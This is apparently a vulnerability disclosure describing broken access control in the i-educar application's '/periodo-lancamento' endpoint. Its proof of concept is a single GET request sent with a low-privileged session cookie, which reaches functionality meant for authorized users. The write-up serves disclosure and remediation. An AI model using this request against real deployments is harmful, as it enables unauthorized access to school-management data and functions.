# Broken Access Control  in `/periodo-lancamento` Endpoint

---

## Summary

A **Broken Access Control** vulnerability was identified in the `/periodo-lancamento` endpoint of the _i-educar_ application. This vulnerability allows users without proper permissions to access restricted functionality, bypassing authorization checks.

---

## Details

**Vulnerable Endpoint:** `GET /periodo-lancamento`  
**Authentication:** Required

The application fails to properly validate user permissions before granting access to this endpoint. As a result, even low-privileged users can successfully access the functionality intended only for permited users .

---

## PoC

1. Authenticate as a non-privileged user.

2. Send the following request::

```
GET /periodo-lancamento HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br, zstd
Connection: keep-alive
Cookie: i_educar_session=[low_privileged cookie]
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
```
    
3. We could observe that we have access to the page and to the function. And, this user, should not do that.
